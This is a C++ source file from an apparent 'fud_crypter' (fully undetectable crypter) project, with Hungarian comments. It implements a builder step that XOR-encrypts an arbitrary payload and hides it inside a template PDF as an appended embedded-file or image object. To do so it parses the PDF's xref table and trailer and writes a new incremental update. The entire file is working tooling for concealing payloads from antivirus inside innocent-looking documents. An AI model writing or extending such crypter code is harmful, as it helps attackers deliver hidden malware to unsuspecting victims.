#include "fud_crypter/builder/builder.hpp"
#include "fud_crypter/crypto/xor_crypto.hpp"
#include <cstring>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <optional>
#include <vector>

namespace fud_crypter {

    // ------------------------------------------------------------------
    // SEGÉDFÜGGVÉNYEK (előre definiálva, mert használjuk őket)
    // ------------------------------------------------------------------
    static bool is_pdf_ws(uint8_t c) {
        return c == 0x00 || c == 0x09 || c == 0x0A || c == 0x0C || c == 0x0D || c == 0x20;
    }
    static bool is_digit(uint8_t c) { return c >= '0' && c <= '9'; }

    static size_t find_bytes(const std::vector<uint8_t>& hay, const char* needle,
                             size_t needle_len, size_t from = 0) {
        if (needle_len == 0 || hay.size() < needle_len) return std::string::npos;
        for (size_t i = from; i <= hay.size() - needle_len; ++i)
            if (std::memcmp(hay.data() + i, needle, needle_len) == 0) return i;
            return std::string::npos;
                             }

                             static bool parse_uint(const std::vector<uint8_t>& b, size_t& pos, uint64_t& out) {
                                 if (pos >= b.size() || !is_digit(b[pos])) return false;
                                 uint64_t v = 0;
                                 while (pos < b.size() && is_digit(b[pos])) {
                                     v = v * 10 + static_cast<uint64_t>(b[pos] - '0');
                                     ++pos;
                                 }
                                 out = v;
                                 return true;
                             }

                             static std::optional<std::string> extract_dict(const std::vector<uint8_t>& b, size_t pos) {
                                 while (pos < b.size() && is_pdf_ws(b[pos])) ++pos;
                                 if (pos + 2 > b.size() || b[pos] != '<' || b[pos + 1] != '<')
                                     return std::nullopt;
                                 const size_t start = pos;
                                 int depth = 0;
                                 while (pos + 1 < b.size()) {
                                     if (b[pos] == '<' && b[pos + 1] == '<') { depth++; pos += 2; continue; }
                                     if (b[pos] == '>' && b[pos + 1] == '>') {
                                         depth--; pos += 2;
                                         if (depth == 0)
                                             return std::string(b.begin() + start, b.begin() + pos);
                                         continue;
                                     }
                                     ++pos;
                                 }
                                 return std::nullopt;
                             }

                             static size_t dict_key_pos(const std::string& d, const std::string& key) {
                                 size_t from = 0;
                                 while (true) {
                                     size_t at = d.find(key, from);
                                     if (at == std::string::npos) return std::string::npos;
                                     size_t after = at + key.size();
                                     if (after >= d.size() ||
                                         is_pdf_ws(static_cast<uint8_t>(d[after])) || d[after] == '/' ||
                                         d[after] == '[' || d[after] == '<' || d[after] == '(')
                                         return after;
                                     from = after;
                                 }
                             }

                             static bool dict_find_int(const std::string& d, const std::string& key, uint64_t& v) {
                                 size_t p = dict_key_pos(d, key);
                                 if (p == std::string::npos) return false;
                                 while (p < d.size() && is_pdf_ws(static_cast<uint8_t>(d[p]))) ++p;
                                 if (p >= d.size() || !is_digit(static_cast<uint8_t>(d[p]))) return false;
                                 uint64_t out = 0;
                                 while (p < d.size() && is_digit(static_cast<uint8_t>(d[p])))
                                     out = out * 10 + static_cast<uint64_t>(d[p++] - '0');
                                 v = out;
                                 return true;
                             }

                             static bool dict_find_ref(const std::string& d, const std::string& key, uint64_t& num, uint64_t& gen) {
                                 size_t p = dict_key_pos(d, key);
                                 if (p == std::string::npos) return false;
                                 auto skip_ws = [&] {
                                     while (p < d.size() && is_pdf_ws(static_cast<uint8_t>(d[p]))) ++p;
                                 };
                                     auto read_uint = [&](uint64_t& out) {
                                         if (p >= d.size() || !is_digit(static_cast<uint8_t>(d[p]))) return false;
                                         out = 0;
                                         while (p < d.size() && is_digit(static_cast<uint8_t>(d[p])))
                                             out = out * 10 + static_cast<uint64_t>(d[p++] - '0');
                                         return true;
                                     };
                                     skip_ws();
                                     if (!read_uint(num)) return false;
                                     skip_ws();
                                 if (!read_uint(gen)) return false;
                                 skip_ws();
                                 return p < d.size() && d[p] == 'R';
                             }

                             static bool dict_has_key(const std::string& d, const std::string& key) {
                                 return dict_key_pos(d, key) != std::string::npos;
                             }

                             // XREF struktúrák
                             struct XrefEntry {
                                 uint64_t object_number;
                                 uint64_t offset_or_next;
                                 uint64_t generation;
                                 char type;
                             };

                             struct XrefResult {
                                 bool is_classic_table = false;
                                 size_t startxref_offset = 0;
                                 std::vector<XrefEntry> entries;
                                 std::string trailer_dict;
                                 std::string note;
                             };

                             static void parse_classic_xref(const std::vector<uint8_t>& b, size_t pos, XrefResult& r) {
                                 while (true) {
                                     while (pos < b.size() && is_pdf_ws(b[pos])) ++pos;
                                     if (pos + 7 <= b.size() && std::memcmp(b.data() + pos, "trailer", 7) == 0) {
                                         if (auto d = extract_dict(b, pos + 7)) r.trailer_dict = *d;
                                         break;
                                     }
                                     uint64_t first = 0, count = 0;
                                     size_t save = pos;
                                     if (!parse_uint(b, pos, first)) { pos = save; break; }
                                     while (pos < b.size() && is_pdf_ws(b[pos])) ++pos;
                                     if (!parse_uint(b, pos, count)) { pos = save; break; }
                                     for (uint64_t k = 0; k < count; ++k) {
                                         while (pos < b.size() && is_pdf_ws(b[pos])) ++pos;
                                         uint64_t f1 = 0, f2 = 0;
                                         if (!parse_uint(b, pos, f1)) return;
                                         while (pos < b.size() && is_pdf_ws(b[pos])) ++pos;
                                         if (!parse_uint(b, pos, f2)) return;
                                         while (pos < b.size() && is_pdf_ws(b[pos])) ++pos;
                                         char type = (pos < b.size()) ? static_cast<char>(b[pos]) : '?';
                                         ++pos;
                                         r.entries.push_back(XrefEntry{first + k, f1, f2, type});
                                     }
                                 }
                                 if (r.note.empty()) r.note = "parsed classic xref table";
                             }

                             static XrefResult parse_xref(const std::vector<uint8_t>& b) {
                                 XrefResult r;
                                 size_t sx = find_bytes(b, "startxref", 9, 0);
                                 if (sx == std::string::npos) { r.note = "no 'startxref'"; return r; }
                                 size_t p = sx + 9;
                                 while (p < b.size() && is_pdf_ws(b[p])) ++p;
                                 uint64_t off = 0;
                                 if (!parse_uint(b, p, off)) { r.note = "startxref unparsable"; return r; }
                                 r.startxref_offset = static_cast<size_t>(off);
                                 if (off >= b.size()) { r.note = "startxref points past EOF"; return r; }
                                 size_t x = static_cast<size_t>(off);
                                 while (x < b.size() && is_pdf_ws(b[x])) ++x;
                                 if (x + 4 <= b.size() && std::memcmp(b.data() + x, "xref", 4) == 0) {
                                     r.is_classic_table = true;
                                     parse_classic_xref(b, x + 4, r);
                                 } else {
                                     r.note = "startxref points to xref stream (PDF 1.5+)";
                                 }
                                 return r;
                             }

                             struct TrailerInfo {
                                 uint64_t root_num = 0, root_gen = 0;
                                 uint64_t size = 0;
                                 bool has_info = false;
                                 uint64_t info_num = 0, info_gen = 0;
                                 bool encrypted = false;
                             };

                             static std::optional<TrailerInfo> read_trailer_info(const XrefResult& xr) {
                                 if (xr.trailer_dict.empty()) return std::nullopt;
                                 TrailerInfo ti;
                                 if (!dict_find_ref(xr.trailer_dict, "/Root", ti.root_num, ti.root_gen))
                                     return std::nullopt;
                                 if (!dict_find_int(xr.trailer_dict, "/Size", ti.size)) return std::nullopt;
                                 ti.has_info = dict_find_ref(xr.trailer_dict, "/Info", ti.info_num, ti.info_gen);
                                 ti.encrypted = dict_has_key(xr.trailer_dict, "/Encrypt");
                                 return ti;
                             }

                             struct ImageInfo {
                                 uint32_t width = 0, height = 0;
                                 int components = 0;
                             };

                             static std::optional<ImageInfo> jpeg_dimensions(const std::vector<uint8_t>& b) {
                                 if (b.size() < 2 || b[0] != 0xFF || b[1] != 0xD8) return std::nullopt;
                                 size_t p = 2;
                                 while (p + 1 < b.size()) {
                                     if (b[p] != 0xFF) { ++p; continue; }
                                     uint8_t marker = b[p + 1];
                                     p += 2;
                                     if (marker == 0xD9 || marker == 0xDA) break;
                                     if (marker >= 0xD0 && marker <= 0xD7) continue;
                                     if (p + 1 >= b.size()) break;
                                     uint32_t seg_len = (static_cast<uint32_t>(b[p]) << 8) | b[p + 1];
                                     bool is_sof = marker >= 0xC0 && marker <= 0xCF && marker != 0xC4 &&
                                     marker != 0xC8 && marker != 0xCC;
                                     if (is_sof) {
                                         if (p + 7 >= b.size()) return std::nullopt;
                                         ImageInfo info;
                                         info.height = (static_cast<uint32_t>(b[p + 3]) << 8) | b[p + 4];
                                         info.width  = (static_cast<uint32_t>(b[p + 5]) << 8) | b[p + 6];
                                         info.components = b[p + 7];
                                         return info;
                                     }
                                     p += seg_len;
                                 }
                                 return std::nullopt;
                             }

                             static std::optional<std::vector<uint8_t>> build_embed_update(
                                 const std::vector<uint8_t>& data, const XrefResult& xr,
                                 const TrailerInfo& ti, const std::vector<uint8_t>& payload,
                                 const std::optional<ImageInfo>& image, uint64_t& obj_num,
                                 std::string& err) {
                                 if (!xr.is_classic_table) {
                                     err = "file uses xref stream (PDF 1.5+)";
                                     return std::nullopt;
                                 }
                                 if (ti.encrypted) {
                                     err = "file is encrypted";
                                     return std::nullopt;
                                 }
                                 obj_num = ti.size;
                                 const uint64_t obj_gen = 0;
                                 const uint64_t new_size = ti.size + 1;

                                 std::string dict = "<< ";
                                 if (image) {
                                     const char* cs = image->components == 1 ? "/DeviceGray"
                                     : image->components == 4 ? "/DeviceCMYK"
                                     : "/DeviceRGB";
                                     dict += "/Type /XObject /Subtype /Image /Width " +
                                     std::to_string(image->width) + " /Height " +
                                     std::to_string(image->height) + " /ColorSpace " + cs +
                                     " /BitsPerComponent 8 /Filter /DCTDecode";
                                 } else {
                                     dict += "/Type /EmbeddedFile";
                                 }
                                 dict += " /Length " + std::to_string(payload.size()) + " >>";

                                 std::string head;
                                 if (!data.empty() && data.back() != '\n' && data.back() != '\r')
                                     head.push_back('\n');
                                 const size_t obj_offset = data.size() + head.size();
                                 head += std::to_string(obj_num) + ' ' + std::to_string(obj_gen) +
                                 " obj\n" + dict + "\nstream\n";

                                 std::string tail = "\nendstream\nendobj\n";
                                 const size_t xref_offset = data.size() + head.size() + payload.size() + tail.size();
                                 tail += "xref\n" + std::to_string(obj_num) + " 1\n";
                                 char entry[64];
                                 std::snprintf(entry, sizeof(entry), "%010zu %05llu n \n", obj_offset,
                                               static_cast<unsigned long long>(obj_gen));
                                 tail += entry;
                                 tail += "trailer\n<< /Size " + std::to_string(new_size) + " /Root " +
                                 std::to_string(ti.root_num) + ' ' + std::to_string(ti.root_gen) + " R";
                                 if (ti.has_info)
                                     tail += " /Info " + std::to_string(ti.info_num) + ' ' +
                                     std::to_string(ti.info_gen) + " R";
                                 tail += " /Prev " + std::to_string(xr.startxref_offset) + " >>\n";
                                 tail += "startxref\n" + std::to_string(xref_offset) + "\n%%EOF\n";

                                 std::vector<uint8_t> out = data;
                                 out.insert(out.end(), head.begin(), head.end());
                                 out.insert(out.end(), payload.begin(), payload.end());
                                 out.insert(out.end(), tail.begin(), tail.end());
                                 return out;
                                 }

                                 // ------------------------------------------------------------------
                                 // TÉNYLEGES PDF EMBED IMPLEMENTÁCIÓ
                                 // ------------------------------------------------------------------
                                 bool Builder::embed_pdf(const std::vector<uint8_t>& payload, const std::vector<uint8_t>& key) {
                                     logger_->info("Embedding into PDF...");

                                     std::string template_path = "template.pdf";
                                     auto pdf_data = read_file(template_path);
                                     if (pdf_data.empty()) {
                                         logger_->error("Template PDF not found: " + template_path);
                                         return false;
                                     }

                                     // XOR titkosítás (a crypto névtérből)
                                     std::vector<uint8_t> stored = crypto::xor_cipher(payload, key);

                                     auto xr = parse_xref(pdf_data);
                                     if (!xr.is_classic_table) {
                                         logger_->error("PDF uses xref stream (not supported)");
                                         return false;
                                     }
                                     auto ti = read_trailer_info(xr);
                                     if (!ti) {
                                         logger_->error("Cannot read trailer info");
                                         return false;
                                     }

                                     std::optional<ImageInfo> image;
                                     bool is_jpeg = (payload.size() > 2 && payload[0] == 0xFF && payload[1] == 0xD8);
                                     if (is_jpeg && key.empty()) {
                                         image = jpeg_dimensions(payload);
                                         if (!image) logger_->warning("Could not read JPEG dimensions, storing as EmbeddedFile");
                                     }

                                     uint64_t obj_num = 0;
                                     std::string err;
                                     auto out = build_embed_update(pdf_data, xr, *ti, stored, image, obj_num, err);
                                     if (!out) {
                                         logger_->error("PDF embed failed: " + err);
                                         return false;
                                     }

                                     if (!write_file(config_.output_file, *out)) {
                                         logger_->error("Cannot write output PDF");
                                         return false;
                                     }

                                     logger_->success("PDF embed successful (object " + std::to_string(obj_num) + ")");
                                     return true;
                                 }

} // namespace fud_crypter
